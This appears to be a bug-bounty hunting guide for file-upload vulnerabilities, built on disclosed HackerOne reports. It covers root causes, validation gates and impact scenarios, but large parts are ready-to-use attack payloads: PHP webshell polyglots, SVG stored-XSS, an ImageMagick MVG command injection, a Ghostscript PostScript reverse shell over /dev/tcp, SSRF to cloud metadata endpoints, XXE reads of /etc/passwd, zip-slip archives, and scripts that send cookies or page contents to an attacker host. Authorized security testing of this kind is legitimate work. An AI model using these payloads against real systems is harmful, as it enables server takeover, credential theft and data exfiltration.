**S3 / ActiveStorage / object storage (#845832, #789579, #1276733, #1984060):**
- Observe the presigned URL request; mutate `contentType` to `image/svg+xml` or `text/html` and see if the PUT is still accepted.
- Modify `byte_size`/`Content-Length` to check for unsigned size fields.
- Fetch the object directly and test transformation endpoints on private files.

**Access-control / state on uploads (#1020371, #501084, #1080839):**
- Replay a captured upload after closing the session, before completing 2FA, and with a swapped `userId`/`personId`.
- Try cross-origin multipart submissions and missing-CSRF-token variants.

### Per-Finding Evidence Checklist

- Exact HTTP request (with headers) that produced the successful upload.
- The URL at which the uploaded file is retrieved, and its `Content-Type` response header.
- Screenshot or raw output proving execution / XSS popup / OOB callback / file read.
- The validation gap explained (which check was missing or bypassed, and how).
- A note on victim impact (who else can be harmed and how).
- A clean 10-minute reproduction sequence a stranger can follow.

---

## Payload & Detection Patterns

### Extension / Content-Type Bypass Ladder
```bash
# Classic webshell served directly
shell.php          Content-Type: image/jpeg
shell.phtml        shell.pHp   shell.php5   shell.pht   shell.shtml

# Double / trailing extension
shell.php.jpg      shell.jpg.php   shell.asp.png   "shell.asp "   (#506646 trailing space)

# Null byte truncation
poc.asp%00.png     shell.php\x00.jpg                              (#2054184, #20616)

# MIME / magic-byte spoof & polyglot
GIF89a;<?php system($_GET['c']); ?>
\x89PNG\r\n\x1a\n<?php ... ?>
```

### Magic Bytes Reference
```
JPEG        FF D8 FF
PNG         89 50 4E 47 0D 0A 1A 0A
GIF         GIF89a / 47 49 46 38
PDF         25 50 44 46
ZIP/DOCX    50 4B 03 04
```
A payload can carry correct magic bytes and still be active content: #964550 kept a valid PNG structure and injected script into the `tEXt Comment` chunk; #357858 embedded PHP in the image DocumentName field.

### Stored XSS via SVG / HTML / Metadata
```xml
<!-- SVG with script, renamed to .png to evade filters (#998422, #880099, #437863) -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(1)</script>
  <polygon points="0,0 0,50 50,0" fill="green"/>
</svg>

<!-- SVG with embedded HTML (#437863) -->
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 105">
  <html><head><title>test</title></head><body><script>alert('xss')</script></body></html>
</svg>

<!-- CSP bypass: uploaded .js included via <script src> (#1380157) -->
<iframe srcdoc="&#x3c;script src='/file-upload/<ID>/payload.js?download'></script>">
```
```bash
# exiftool metadata XSS (#964550) and PHP shell in metadata (#357858)
exiftool -Comment='"><script>alert(document.cookie)</script>' x.png
exiftool -DocumentName='<?php echo file_get_contents("/etc/passwd"); ?>' pic.png
# then intercept and change multipart Content-Type image/png -> text/html (#964550)
```

### Filename-as-XSS Sink
```
"><img src=1 onerror="...">.png          # filename param (#1010466)
Dinosaurs secret life<img src=x onerror=alert(1)>.png   # "file too large" error (#203515)
<U+202E unicode-prefixed filename>.png   # unicode normalization (#179695)
"><img src = x onerror=alert(2)>.mp4     # FTP-supplied video filename (#45368)
```
The CS Money report #1010466 encoded the payload with `String.fromCharCode` to survive filtering — note that filter-evasion encoding is itself a bypass technique.

### ImageMagick / MVG / PostScript RCE
```
# MVG command execution (#135072) — upload as x.gif
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context

# PostScript / Ghostscript reverse shell (#403417) — save as test.jpg
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/IP/8080 0>&1') currentdevice putdeviceprops
```

### FFmpeg / SVG / XXE SSRF & File Read
```
# FFmpeg HLS playlist (#1062888, #570537) — upload as .m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST

# FFmpeg concat demuxer
ffconcat version 1.0
file 'http://COLLAB/ffmpeg-ssrf'

# SVG external resource / XXE (#97501, #845832)
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB/svg-ssrf" width="200" height="200"/>
</svg>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

### Upload-from-URL SSRF
```bash
# Profile-photo / URL downloader (#713, #1691501, #158016, #228377)
url=http://COLLAB/test.png
file=http://127.0.0.1/test.png
list[remote_image_url]=http://127.0.0.1:21
url=http://169.254.169.254/latest/meta-data/

# change a file input to a URL input in the DOM (#713)
<input type="file">  ->  <input type="url">
```
The upload-from-URL field in #1691501 was `file=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&...&accepted_types[]=.png` — note the `accepted_types[]` array and the URL-encoded `file` value; both are worth fuzzing.

### Path Traversal / Archive Attacks
```
../../etc/passwd in filename or path param          (#343726, #683965)
overrideLocalStorageUrl=..\\..\\Startup\\           (#683965 Windows Startup folder)
imgnum=1..10 user-controlled logo count to overwrite (#259913)
zip-slip: ../../../var/www/html/shell.php in ZIP
symlink in TAR (zip -ry / tar --dereference) to /etc/passwd
```

### Detection / Verification One-Liners
```bash
# Confirm uploaded script executes
curl -s "https://TARGET/uploads/shell.phtml?c=id"
curl -s "https://TARGET/savefiles/poc.asp?cmd=dir"        # (#2054184)

# Confirm server-side fetch from uploaded SVG/URL (OOB)
interactsh-client -v     # then upload payload pointing at YOUR_ID.oast.pro

# Confirm direct S3/public exposure
curl -s -I "https://BUCKET.s3.amazonaws.com/UPLOADED_KEY"

# Grep source for upload sinks
grep -rE "(multipart|move_uploaded_file|multer|formidable|UploadFile|presigned)" \
  --include="*.py" --include="*.js" --include="*.php"
```

### Office / Archive / Deserialization Payloads

```bash
# ZIP-slip — escape the extraction directory (upload to /import, /extract, /unzip)
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# TAR symlink — link an "innocent" entry to a sensitive file
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# DOCX XXE — hide a DTD inside the ZIP-based Office format (#845832, #105787)
# [Content_Types].xml / word/document.xml:
# <!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> ... &xxe;

# PHP phar deserialization — upload a phar, trigger via file_exists()/fopen() on phar://
# (useful when direct .php execution is disabled but a file-sink exists)
curl -s "https://TARGET/index.php?file=phar:///uploads/payload.phar"
```

### Wordlist / Fuzzing Notes

- Fuzz hidden upload paths with a directory wordlist; #2054184's `repos` endpoint was found purely by fuzzing.
- Fuzz parameter names around uploads: `file`, `url`, `remote_image_url`, `filename`, `contentType`, `imgnum`, `userId`, `set`, `accepted_types[]`.
- When testing extension handling, submit a matrix instead of one value: `{php,php5,phtml,pht,asp,aspx,jsp,shtml,html,svg}` × `{plain, double-ext, null-byte, trailing-space, case}`.
- Use a unique Collaborator subdomain per test to attribute callbacks to the correct sink — reuse across multiple fields makes attribution impossible.

---

## Common Root Causes

1. **Client-side-only validation.** The extension/MIME allowlist lives in JavaScript and is trivially bypassed in the proxy. #1606957 (drag-drop blocked .docx, "Click to browse" didn't), #964550 (MIME edited after selection), #97672 (.jpg→.html with `Content-Type: text/html`). The server must repeat every check.

2. **Trusting the filename / MIME header instead of content.** The server believes `filename=` or `Content-Type` without checking magic bytes or parsing the file. #1010466 (filename param XSS), #20720 (Content-Type header XSS), #463604 (anything accepted as an image), #808287 (contact image accepts any data type).

3. **Allowlist checks the wrong extension.** Only the first or last extension is validated, with no null-byte/space/case normalization. #2054184 (null byte), #506646 (trailing space), #437863 (SVG on an allowlist), #998422 (SVG content with `.png` extension).

4. **Interpreter execution in the upload directory.** Uploaded .php/.asp/.aspx/.shtml files are served with handler execution enabled. #357858, #506646, #1027822 (Starbucks mobile RCE), #412481 (shtml SSI read of web.config), #900179 (HTML + PHP shell creation).

5. **Powerful processors fed untrusted bytes.** ImageMagick/FFmpeg/XML parsers treat ASCII or XML as executable directives (MVG, PostScript, HLS, external entities) and fetch remote URLs or run commands. #403417, #135072, #1062888, #97501, #845832. This is why `image-processing` is the #2 signal.

6. **Active file types allowed and served inline.** SVG/HTML are accepted and served on the same origin without `Content-Disposition: attachment` or sandboxing, enabling stored XSS. #880099, #765679, #130591, #894876/#998422, #1380157 (uploaded `.js` bypasses CSP).

7. **User-controlled destination path / missing access control.** The upload path, folder, or target user ID is attacker-influenced; no authz on the endpoint. #343726 (any path), #683965 (SYSTEM Startup folder), #671605 (S3 overwrite), #501084 (other user's avatar), #1020371 (closed account), #2450215 (other's form).

8. **Server-side fetch of user-supplied URLs with no SSRF defenses.** "Upload from URL" features fetch internal addresses with no blocklist of RFC1918/link-local. #713, #228377, #158016, #1691501, #549882, #296045.

9. **Metadata/derived-data injection.** EXIF/comment fields and error messages interpolate filenames unsafely into HTML/DOM. #964550, #357858, #203515, #179695, #45368, #375352 (reflected XSS via `CKEditorFuncNum`).

10. **Presigned URL / storage misconfiguration.** Unsigned content-length, public-write buckets, transformations that flip private to public. #789579, #1276733, #504600, #1984060, #126374.

11. **Missing resource limits.** No size checks or dimension caps let a tiny upload exhaust memory. #19532 (2.52 GB, no warning), #1620170 (max-dimension GIF consuming >4 GB), #259913 (unlimited logos → DoS).

12. **Debug/admin interfaces exposed without auth.** A debug page that can upload/read/delete files is an instant finding. #1714767, plus unauth `/upload.php` in #698789/#698793 and the CORS-wildcard upload in #3765476.

### Root-Cause → Report Mapping

| Root cause | Typical report title | Severity driver |
|---|---|---|
| Client-only validation | "Unrestricted file upload" | Whether server repeats the check |
| Trusted filename/MIME | "File Upload XSS..." | Where the name is reflected |
| Extension allowlist gap | "Shell upload" | Handler execution in upload dir |
| Untrusted processor input | "RCE via profile picture upload" | Command/callback proof |
| Active file served inline | "Stored XSS via SVG upload" | Victim reach + session value |
| Controllable path | "Arbitrary file overwriting" | What is overwritten |
| Server-side URL fetch | "SSRF in upload IMG through URL" | Blind vs full-read |
| Metadata/error interpolation | "XSS via unicode in filename" | Admin/victim browser context |
| Storage misconfig | "Open s3 bucket allows public upload" | Data exposure scope |
| Missing size limits | "DOS: out of memory from gif" | Resource impact |

---

## Bypass Techniques

### Extension / Filename Bypasses
```
Double extension:      shell.php.jpg  /  shell.jpg.php
Null byte:             shell.php%00.jpg  /  poc.asp\x00.png
Trailing space/dot:    "shell.asp "  /  "shell.php."      (#506646)
Case variation:        shell.pHp  shell.PhP  shell.PHP5
Handler aliases:       .phtml .pht .php5 .php7 .shtml .asp; .jsp
Metadata prefix:       GIF89a;<?php ... ?>  /  PNG magic + script
Unicode:               leading unicode char in filename      (#179695)
```
Note the order matters: if the server checks the *first* extension use `shell.php.jpg`; if it checks the *last* use `shell.jpg.php`; if it strips one extension use a double-ext like `poc.asp.png` with a null byte between (#2054184).

### Content-Type / MIME Bypasses
```
Declare image/jpeg for a PHP/HTML body (#964550, #97672).
Change presigned content-type to image/svg+xml (#845832) or text/html.
Content-Type: text/html; charset=<html><script>...</script></html>  (#20720)
Serve a .php body with an image Content-Type; or .html body via .png name.
String.fromCharCode-encode the payload to evade string filters (#1010466).
```

### Processor / Parser Bypasses
```
ImageMagick treats ASCII as MVG — upload plain text as .gif (#135072).
PostScript/EPS reaches Ghostscript when policy.xml is weak (#403417).
SVG renamed to .png/.jpg still parsed/served as XML/HTML (#998422, #894876).
DOCX/XLSX = ZIP of XML — hide a DTD in [Content_Types].xml / word/document.xml (#845832, #105787).
FFmpeg follows remote URLs in HLS/concat playlists regardless of file extension (#1062888).
SVG <image xlink:href> fetches external resources during server-side parse (#97501).
```

### Path / Storage Bypasses
```
Traverse with ../.. in filename or path param (#343726).
Abuse user-controlled imgnum / overrideLocalStorageUrl to write arbitrary paths (#683965, #259913).
Upload a TAR/ZIP symlink to a sensitive file, or a zip-slip entry (#671605).
A transformation endpoint can re-publish a private upload publicly (#1984060).
Reuse/replay a presigned URL outside its intended content-type or size (#789579).
```

### Authorization / Flow Bypasses
```
Stop the redirect after /admin/* auth check to reach upload (#683957).
Bypass client-side filter via a different UI path ("Click to browse") (#1606957).
Replay captured request after logout/closure/before 2FA (#1020371, #1080839).
Change userId / personId / scope id to upload on behalf of another (#501084, #741683, #2450215).
No CSRF token on multipart POST — cross-origin auto-submitting form (#401483, #3765476).
Upload to a forgotten subdomain with weaker controls (#3414079, #1080839, #1276733).
```

### Detection-Evasion Notes
- A 500 after upload can still mean the file landed — locate it by response timestamp (#357858).
- Some servers execute only specific handlers: `.php` as text but `.phtml` executed, or PHP disabled but `.shtml` SSI works (#155690, #412481).
- Filters can be chained-bypassed: Nextcloud's SVG XSS was reported as #894876, bypassed in #998422 (rename to PNG), and bypassed again in the broader chain — always retest after a fix.
- Verify the "bypass" actually changes behavior: a file accepted but never served/executed/parsed is not a bypass (Gate 0).

---

## Gate 0 Validation

Three questions must all be answered before submitting. Adapted for upload's write-only-blob problem: an uploaded file that is never executed, served, or parsed is not a finding.

1. **What can the attacker do right now?**
   - RCE: show actual command output — `whoami`, `id`, `dir`, `ls`, or `/etc/passwd` contents from the uploaded shell/MVG/PS payload (#357858, #2054184, #403417). A file merely present is not RCE.
   - Stored XSS: show the payload executing in a **victim's** browser (alert/popup/cookie), not just the file on disk (#880099, #765679, #3115705).
   - SSRF/XXE: show an OOB callback from the parser/fetcher or the internal response body (#97501, #1062888, #845832).
   - Arbitrary write: show the file at the attacker-chosen path and identify what it overwrites (#671605, #683965).
   - If the answer is only "the file uploaded successfully," severity is informational.

2. **What does the victim lose?**
   - Server/container compromise and lateral movement (RCE chains).
   - Credential/token theft, cloud metadata access, internal service data (SSRF/XXE).
   - Session hijack / privilege escalation / full workspace or account takeover (stored XSS on a shared surface).
   - Data destruction or defacement (arbitrary overwrite).
   - If nothing is executed, served to others, parsed, or exposed, there is no loss — do not report as a high-severity finding. This is the single most common reason "unrestricted upload" reports get closed as informational.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the upload endpoint still live and the validation gap still present?
   - Does the shell execute / XSS fire / callback arrive reliably on repeat?
   - Can a second person follow only your steps and get the same result?
   - Resolve flakiness (timestamps, caches, race conditions like the SFTP TOCTOU in #3432833) before submitting.

---

## Real Impact Examples

### Scenario A: Logo Upload → ImageMagick → Ghostscript RCE (Semrush #403417 pattern)
The report-constructor logo upload passed an attacker-supplied file to a not-properly-patched ImageMagick. Uploading a `%!PS` PostScript file as `test.jpg` caused Ghostscript to be invoked; the `mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/IP/8080 0>&1')` directive opened a reverse shell. The researcher demonstrated `ls` and directory contents of the server. Root cause: an executable, network-capable interpreter was reachable from an untrusted image upload with a weak policy.xml. Critical RCE. The companion HackerOne #135072 achieved the same class via MVG: an ASCII file named `x.gif` with `image over ... \`wget -O- 1.2.3.4:1337\`` executed `wget` on the server.

### Scenario B: SVG-as-PNG Stored XSS → Session/Workspace Takeover (GitLab #880099 / Dust #3115705 pattern)
An attacker uploaded an SVG file containing `<svg onload="alert(1)">` and JavaScript, named with a `.png` extension, into a wiki page (GitLab) or workspace file store (Dust). Because the file was served on the same origin and rendered as active content, a victim who viewed the page/file executed the script. Palo Alto #765679 used a two-account attacker/victim setup with SVG renamed to png/gif/bmp and `onload="alert(document.cookie)"` to steal cookies. In Dust this escalated to issuing authenticated API requests as the victim and full workspace takeover. Root cause: active file types accepted and served inline without sanitization or isolation.

### Scenario C: Upload-from-URL → SSRF → Internal Service Disclosure (Instacart #158016 / Aiven #1547877 pattern)
Instacart's list-image update accepted `list[remote_image_url]=https://...`. Changing it to `http://127.0.0.1:21` returned an error containing the SSH banner `SSH-2.0-OpenSSH_6.6.1p1 Ubuntu...`, proving the server connected to an internal port. Discourse #228377 crafted an image markdown link to an internal host and observed HEAD/GET requests originating from the Discourse server. Aiven's chain went further: a SQLite JDBC file upload plus an HTTP sink connector able to reach `localhost:6725` (unprotected Jolokia) yielded full RCE — a $5,000 critical. Root cause: user-controlled URL/path fetched by a privileged server process with no internal-network blocklist.

### Scenario D: Null-Byte Extension Truncation → Webshell RCE (DoD #2054184 pattern)
The upload endpoint saved files whose extension was truncated at a null byte. Submitting `poc.asp%00.png` passed the image extension check but wrote `poc.asp` to `/savefiles/`. Visiting `.../savefiles/poc.asp?cmd=dir` executed arbitrary ASP commands (`dir` shown). Starbucks #506646 used a different trick — a trailing space after `asp/aspx` — to the same effect of dropping the real extension. Root cause: extension validation that did not sanitize null bytes/whitespace, combined with handler execution in the upload directory.

### Scenario E: Arbitrary File Overwrite via Filename Traversal (Mail.ru #671605 pattern)
Directory traversal in an avatar-upload filename extension let the attacker write files to arbitrary keys in an S3-compatible static-file bucket for pandao.ru, overwriting existing objects — a $750 bounty. express-cart #343726 let an admin upload to any server path; Nexus #683965 wrote a PE executable to the Windows Startup folder where the SYSTEM-level process would execute it at next login. Root cause: attacker-controlled path used in the storage write without normalization or confinement.

### Scenario F: Upload → Public Cloud Storage Exposure (Reddit #1276733 / Mozilla #1984060 pattern)
A researcher discovered an S3 bucket belonging to studio.redditinc.com and used an authenticated AWS CLI to upload files, demonstrating public write access. Mozilla #1984060 showed a subtler variant: a user uploaded a private file (e.g., a KYC selfie holding a passport), then used the "View transformations" feature; regenerating a transformation republished the file publicly with no way to revert it to private. Radancy #2007235 showed every uploaded file viewable without authentication via a single guessable link. Root cause: object-storage permissions and transformation pipelines that do not preserve confidentiality.

### Scenario G: Upload → Resource Exhaustion / DoS (Mattermost #1620170 / Uzbey #19532 pattern)
Mattermost's upload API accepted a GIF with maximum dimensions; processing it consumed more than 4 GB of RAM and killed a container limited to 4 GB. Uzbey #19532 reported that a 2.52 GB upload produced no size warning, risking memory exhaustion. Open-Xchange #989668 consumed ~100% CPU via an uploaded managesieve script. Root cause: no size, dimension, or runtime limits on processing attacker-supplied files. These are typically low severity ($150 for #1620170) but real.

---

## Disclosed Report Citations (30 verified, real IDs)

1. **Semrush — Remote Code Execution on www.semrush.com/my_reports on Logo upload** ([H1 #403417](https://hackerone.com/reports/403417)) — ImageMagick/PostScript-to-Ghostscript RCE, image upload, 2018.
2. **Starbucks — Webshell via File Upload on ecjobs.starbucks.com.cn** ([H1 #506646](https://hackerone.com/reports/506646)) — ASPX webshell via avatar upload with trailing-space bypass, 2018.
3. **CS Money — Blind XSS on image upload** ([H1 #1010466](https://hackerone.com/reports/1010466)) — stored/blind XSS in `filename` param + CSRF on upload endpoint, $1,000, 2020.
4. **Mail.ru — Unrestricted file upload on ambassador.mail.ru** ([H1 #854032](https://hackerone.com/reports/854032)) — unrestricted file upload, $3,000.
5. **Vimeo — SSRF leaking internal google cloud data through upload function [SSH Keys, etc..]** ([H1 #549882](https://hackerone.com/reports/549882)) — SSRF via upload → internal GCP data disclosure.
6. **GitLab — Unrestricted file upload leads to Stored XSS** ([H1 #880099](https://hackerone.com/reports/880099)) — JS-in-SVG-as-PNG stored XSS in wiki, 2020.
7. **TikTok — External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing** ([H1 #1062888](https://hackerone.com/reports/1062888)) — FFmpeg HLS SSRF + LFI, $2,727.
8. **Semrush — Unrestricted file upload in www.semrush.com /my_reports/api/v1/upload/image** ([H1 #748903](https://hackerone.com/reports/748903)) — unrestricted file upload.
9. **Basecamp — User can upload files even after closing his account** ([H1 #1020371](https://hackerone.com/reports/1020371)) — broken authz on ActiveStorage `direct_uploads`, 2020.
10. **HackerOne — Any user could upload attachments to pentest scoping form they don't have access to** ([H1 #2450215](https://hackerone.com/reports/2450215)) — access control on attachment upload.
11. **Xiaomi — Insecure file upload in xiaoai.mi.com Lead to Stored XSS** ([H1 #882733](https://hackerone.com/reports/882733)) — stored XSS via upload.
12. **Dust — Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover** ([H1 #3115705](https://hackerone.com/reports/3115705)) — stored XSS → full workspace takeover.
13. **TikTok — Unrestricted File Upload on partner.tiktokshop.com/wsos_v2/oec_partner/upload** ([H1 #1890284](https://hackerone.com/reports/1890284)) — unrestricted file upload.
14. **Zivver — XXE Injection through SVG image upload leads to SSRF** ([H1 #897244](https://hackerone.com/reports/897244)) — SVG XXE → SSRF.
15. **Mail.ru — Avatar upload allows arbitrary file overwriting** ([H1 #671605](https://hackerone.com/reports/671605)) — directory traversal via filename → S3 overwrite, $750.
16. **Aiven Ltd — [Kafka Connect] RCE by file upload via SQLite JDBC driver and SSRF to internal Jolokia** ([H1 #1547877](https://hackerone.com/reports/1547877)) — upload+SSRF-to-RCE chain, $5,000, 2022.
17. **Rocket.Chat — Upload of Avatars for other Users** ([H1 #501084](https://hackerone.com/reports/501084)) — IDOR via `ufsImportURL` with another `userId`, 2019.
18. **Starbucks — China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability** ([H1 #412481](https://hackerone.com/reports/412481)) — html/shtml upload → internal IP / web.config read, 2018.
19. **HackerOne — Upload profile photo from URL** ([H1 #713](https://hackerone.com/reports/713)) — SSRF via `type=file`→`type=url` profile photo, 2014.
20. **Monero — forum.getmonero.org Shell upload** ([H1 #357858](https://hackerone.com/reports/357858)) — exiftool-embedded PHP shell renamed `.php` → `/etc/passwd` read, 2018.
21. **U.S. Dept Of Defense — RCE via File Upload with a Null Byte Truncated File Extension** ([H1 #2054184](https://hackerone.com/reports/2054184)) — null-byte extension truncation → ASP webshell RCE, 2023.
22. **Discourse — SSRF in upload IMG through URL** ([H1 #228377](https://hackerone.com/reports/228377)) — SSRF via uploaded image URL, $64, 2017.
23. **HackerOne — RCE in profile picture upload** ([H1 #135072](https://hackerone.com/reports/135072)) — ImageMagick MVG-as-GIF command injection, 2016.
24. **Shopify — XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com** ([H1 #964550](https://hackerone.com/reports/964550)) — PNG metadata/exiftool XSS + MIME change, 2020.
25. **Shopify — SVG parser loads external resources on image upload** ([H1 #97501](https://hackerone.com/reports/97501)) — SVG `xlink:href` server-side SSRF, 2015.
26. **U.S. Dept Of Defense — Blind SSRF via image upload URL downloader** ([H1 #1691501](https://hackerone.com/reports/1691501)) — blind SSRF via `file=` URL downloader, 2022.
27. **U.S. Dept Of Defense — Unauthenticated arbitrary file upload** ([H1 #698789](https://hackerone.com/reports/698789)) — unauth `upload.php` → file hosting/XSS, 2019.
28. **Instacart — Server side request forgery on image upload for lists** ([H1 #158016](https://hackerone.com/reports/158016)) — SSRF via `list[remote_image_url]`, $50, 2016.
29. **GitLab — Reporters can upload design to issues using the "Move to" feature** ([H1 #1112297](https://hackerone.com/reports/1112297)) — privilege escalation on design upload, $600, 2021.
30. **Rocket.Chat — Content-Security Policy bypass with File Uploads** ([H1 #1380157](https://hackerone.com/reports/1380157)) — uploaded `.js` bypasses CSP, stored-XSS escalation, 2021.

### Technique Index of These 30 Citations

- **Processor RCE:** #403417, #135072, #1547877.
- **Webshell / extension bypass RCE:** #506646, #2054184, #357858.
- **Stored / blind XSS:** #1010466, #880099, #964550, #3115705, #1380157, #882733.
- **SSRF via upload-from-URL / parser:** #713, #228377, #158016, #1691501, #549882, #97501, #897244, #1062888.
- **Arbitrary write / overwrite:** #671605, #698789.
- **Access control / IDOR / CSRF on upload:** #1020371, #501084, #2450215, #1112297.
- **Unrestricted file upload (general):** #854032, #748903, #1890284.
- **html/shtml handler abuse:** #412481.

All report IDs and URLs above are drawn verbatim from the assigned study pack and the TOP-UPLOAD list; no identifiers were invented.

---

## Related Skills & Chains

- **`hunt-rce`** — Upload is the classic RCE delivery path. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` + `.phtml` → `GET /uploads/shell.phtml?c=id`; or ImageMagick MVG/PS (#403417, #135072), or SQLite-JDBC file + Jolokia (#1547877). Critical RCE always needs the `whoami`/`dir` round-trip.
- **`hunt-ssrf`** — Upload-from-URL and parser-driven URL fetches are SSRF sinks. Chain primitive: `url=`/`file=`/`remote_image_url=` → internal ports/metadata (#713, #158016, #1691501); SVG/FFmpeg external refs → IMDS creds (#97501, #1062888). Apply the OOB-or-it-didn't-happen gate to blind cases.
- **`hunt-xxe`** — Office/SVG/SOAP uploads are XML inside a container. Chain primitive: DOCX `[Content_Types].xml` or SVG DOCTYPE with external entity → OOB file read / SSRF (#845832, #897244, #105787).
- **`hunt-xss`** — Served SVG/HTML/metadata/filename uploads are stored-XSS factories. Chain primitive: SVG `<script>` served same-origin → session theft / ATO / workspace takeover (#880099, #765679, #3115705, #964550).
- **`hunt-access-control`** — Upload endpoints routinely miss authz/CSRF. Chain primitive: replay after logout/closure, change `userId`/`personId`, drop CSRF token (#1020371, #501084, #401483, #2450215).
- **`security-arsenal`** — Reach for the file-upload bypass tree: extension/MIME/magic-byte tables, polyglot generators, SVG/MVG payloads, DOCX-XXE templates, zip-slip/symlink archives, and the magic-byte reference above.
- **`triage-validation`** — Apply the Gate 0 Reproducibility Gate. An uploaded-but-never-executed/served/parsed file is a write-only blob, not a finding. Critical RCE needs the `whoami`/`dir` round-trip; stored XSS needs the payload to fire in a victim's browser.


---

## Merged Source Knowledge

This section consolidates **10 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (15 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-file-upload/SKILL.md`

# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## Related Skills & Chains

- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
